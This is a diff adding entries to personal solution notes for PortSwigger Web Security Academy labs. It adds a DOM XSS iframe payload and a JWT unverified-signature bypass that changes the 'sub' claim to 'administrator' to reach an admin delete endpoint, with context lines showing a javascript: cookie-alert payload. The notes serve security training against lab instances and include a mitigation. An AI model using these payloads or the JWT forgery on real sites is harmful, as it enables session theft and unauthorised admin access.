@@ -85,6 +85,28 @@ Solution:
 
     https://accb1fd31e8cc586c08e432600d300df.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
 
+### Lab: DOM XSS in jQuery selector sink using a hashchange event
+
+    https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
+
+Payload: `<iframe src="https://acc21f141f0e6cfcc070115f007d004e.web-security-academy.net#" onload="this.src+='<img src=1 onerror=print()>'">`
+
+Solution:
+
+    Entice user to visit malicious/3rd party server with planted payload above.
+
+### Lab: Reflected XSS into attribute with angle brackets HTML-encoded
+
+    https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
+
+### Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
+
+    https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded
+
+### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
+
+    https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded
+
 ## OAuth authentication
 
 ### Lab: Forced OAuth profile linking
@@ -1315,3 +1337,24 @@ curl -L -k -x 127.0.0.1:8080 --cookie 'session=jhDhbpkpWYLfS9HVTLGS6pDBh6PydHYo'
 ### Lab: Clickjacking with a frame buster script
 
     https://portswigger.net/web-security/clickjacking/lab-frame-buster-script
+
+## JWT
+
+### Lab: JWT authentication bypass via unverified signature
+
+**Target**
+
+    https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature
+
+**Discovery**
+
+    Modify `sub` field in JWT's payload. Request `GET /my-account`. Observe that your username has changed.
+
+**Exploitation**
+
+    Modify `sub` field in JWT's payload to `administrator`. Request `GET /admin/delete?username=carlos`.
+
+**Mitigation**
+
+    Verify JWT signature on the backend and reject all requests with invalid signature.
+
